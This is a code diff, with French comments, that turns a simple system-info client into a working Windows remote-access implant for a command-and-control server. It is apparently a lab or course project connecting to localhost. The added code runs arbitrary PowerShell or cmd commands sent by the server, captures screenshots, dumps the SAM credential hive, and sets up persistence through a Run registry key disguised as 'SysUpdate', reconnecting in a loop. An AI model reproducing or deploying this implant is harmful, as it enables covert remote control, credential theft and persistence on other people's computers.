@@ -1,124 +1,175 @@
-
-import json
 import socket
+import platform
+import psutil
 import subprocess
+import json
+import time
+import os
+import base64
+import io
+import getpass
+import winreg
+from datetime import datetime
 
-from src.c2.protocol import encode_message, decode_message
-from src.lin.system_info import get_system_info, get_users_info
+try:
+    from PIL import ImageGrab
+    HAS_PIL = True
+except ImportError:
+    HAS_PIL = False
 
-
-SERVER_HOST = "192.168.1.198"
+SERVER_IP   = "127.0.0.1"
 SERVER_PORT = 5000
+RECONNECT_DELAY = 5
 
 
+def log(msg):
+    print(f"[{datetime.now():%H:%M:%S}] {msg}", flush=True)
+
+
+def send_line(sock, obj):
+    sock.sendall((json.dumps(obj) + "\n").encode("utf-8"))
+
+
+def recv_line(fileobj):
+    line = fileobj.readline()
+    if not line:
+        return None
+    return json.loads(line.decode("utf-8"))
+
+
+# -------------------- INFOS MACHINE --------------------
 def get_network_interfaces():
-    """Récupère les adresses IPv4 des interfaces réseau."""
-
-    try:
-        result = subprocess.run(
-            ["ip", "-j", "-4", "addr", "show"],
-            capture_output=True,
-            text=True,
-            check=True,
-            timeout=5
-        )
-
-        interfaces = json.loads(result.stdout)
-        network_info = []
-
-        for interface in interfaces:
-
-            # Ignore l'interface localhost
-            if interface.get("ifname") == "lo":
-                continue
-
-            for address in interface.get("addr_info", []):
-
-                if address.get("family") == "inet":
-                    network_info.append({
-                        "interface": interface.get("ifname"),
-                        "ip": address.get("local"),
-                        "prefix": address.get("prefixlen")
-                    })
-
-        return network_info
-
-    except (
-        OSError,
-        subprocess.SubprocessError,
-        json.JSONDecodeError
-    ) as error:
-        print(f"[-] Erreur de récupération réseau : {error}")
-        return []
+    result = []
+    for name, addresses in psutil.net_if_addrs().items():
+        for a in addresses:
+            if a.family == socket.AF_INET and not a.address.startswith(
+                ("127.", "169.254.")
+            ):
+                result.append({"interface": name, "ipv4": a.address})
+    return result
 
 
-def create_client_message():
-    """Prépare les informations système envoyées au serveur."""
-
-    system_info = get_system_info()
-    users = get_users_info()
-
-    # Recherche les informations du compte actuellement utilisé
-    current_user = next(
-        (
-            user for user in users
-            if user["username"] == system_info["username"]
-        ),
-        None
-    )
-
-    if current_user:
-        user_info = {
-            "username": current_user["username"],
-            "uid": current_user["uid"],
-            "gid": current_user["gid"]
-        }
-    else:
-        user_info = {
-            "username": system_info["username"]
-        }
-
+def get_hello():
     return {
         "type": "hello",
-        "hostname": system_info["hostname"],
-        "username": system_info["username"],
-        "system": system_info["system"],
-        "distribution": system_info["distribution"],
-        "architecture": system_info["architecture"],
-        "user_info": user_info,
-        "interfaces": get_network_interfaces()
+        "hostname": socket.gethostname(),
+        "username": getpass.getuser(),
+        "system": platform.system(),
+        "distribution": platform.platform(),
+        "architecture": platform.machine(),
+        "interfaces": get_network_interfaces(),
     }
 
 
-def connect_to_server():
-    """Envoie les informations Linux au serveur Windows."""
-
-    message = create_client_message()
-
+# -------------------- COMMANDES --------------------
+def run_shell(cmd: str) -> str:
     try:
-        with socket.create_connection(
-            (SERVER_HOST, SERVER_PORT),
-            timeout=5
-        ) as client_socket:
+        out = subprocess.check_output(
+            ["powershell", "-NoProfile", "-Command", cmd],
+            stderr=subprocess.STDOUT, timeout=30
+        )
+        return out.decode(errors="ignore")
+    except Exception:
+        try:
+            out = subprocess.check_output(
+                ["cmd", "/c", cmd],
+                stderr=subprocess.STDOUT, timeout=30
+            )
+            return out.decode(errors="ignore")
+        except Exception as e:
+            return f"[!] {type(e).__name__}: {e}"
 
-            print("[+] Connexion au serveur réussie")
 
-            client_socket.sendall(encode_message(message))
+# -------------------- SCREENSHOT --------------------
+def take_screenshot() -> str:
+    if not HAS_PIL:
+        return "[!] pillow non installé (pip install pillow)"
+    try:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format="PNG")
+        return base64.b64encode(buf.getvalue()).decode()
+    except Exception as e:
+        return f"[!] {e}"
 
-            with client_socket.makefile("rb") as server_file:
-                response_data = server_file.readline()
 
-            if not response_data:
-                print("[-] Le serveur a fermé la connexion.")
-                return
+# -------------------- SAM --------------------
+def dump_sam():
+    try:
+        out = os.path.join(os.environ.get("TEMP", "C:\\"), "sam.hiv")
+        r = subprocess.run(
+            ["reg", "save", "HKLM\\SAM", out, "/y"],
+            capture_output=True, text=True, timeout=20
+        )
+        if r.returncode != 0:
+            return f"[!] admin requis : {r.stderr.strip()}"
+        return f"[+] SAM exportée : {out} ({os.path.getsize(out)} o)"
+    except Exception as e:
+        return f"[!] {type(e).__name__}: {e}"
 
-            response = decode_message(response_data)
 
-            print("[+] Réponse du serveur :", response)
+# -------------------- REGISTRE --------------------
+def add_registry_key():
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        script = os.path.abspath(__file__)
+        cmd = f'pythonw "{script}"'
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
+        ) as k:
+            winreg.SetValueEx(k, "SysUpdate", 0, winreg.REG_SZ, cmd)
+        return f"[+] Clé Run\\SysUpdate ajoutée : {cmd}"
+    except Exception as e:
+        return f"[!] {type(e).__name__}: {e}"
 
-    except (OSError, ValueError) as error:
-        print(f"[-] Erreur de communication : {error}")
+
+# -------------------- DISPATCH --------------------
+def dispatch(msg):
+    t = msg.get("type")
+    try:
+        if t == "command":    return run_shell(msg.get("command", ""))
+        if t == "screenshot": return take_screenshot()
+        if t == "enum":       return {"sam": dump_sam(), "reg": add_registry_key()}
+        if t == "sam":        return dump_sam()
+        if t == "reg":        return add_registry_key()
+        if t == "persist":    return add_registry_key()
+        return f"[!] type inconnu : {t}"
+    except Exception as e:
+        return f"[!] {type(e).__name__}: {e}"
+
+
+# -------------------- BOUCLE --------------------
+def connect():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((SERVER_IP, SERVER_PORT))
+            log(f"[+] connecté à {SERVER_IP}:{SERVER_PORT}")
+            return s
+        except Exception as e:
+            log(f"[!] reconnexion {RECONNECT_DELAY}s : {e}")
+            time.sleep(RECONNECT_DELAY)
+
+
+def main():
+    while True:
+        s = connect()
+        try:
+            send_line(s, get_hello())
+            f = s.makefile("rb")
+            while True:
+                msg = recv_line(f)
+                if msg is None:
+                    log("[-] serveur déconnecté")
+                    break
+                log(f"[>] {msg.get('type')}")
+                send_line(s, {"type": "command_result", "result": dispatch(msg)})
+        except Exception as e:
+            log(f"[!] {type(e).__name__}: {e}")
+        finally:
+            s.close()
+        time.sleep(RECONNECT_DELAY)
 
 
 if __name__ == "__main__":
-    connect_to_server()
+    main()
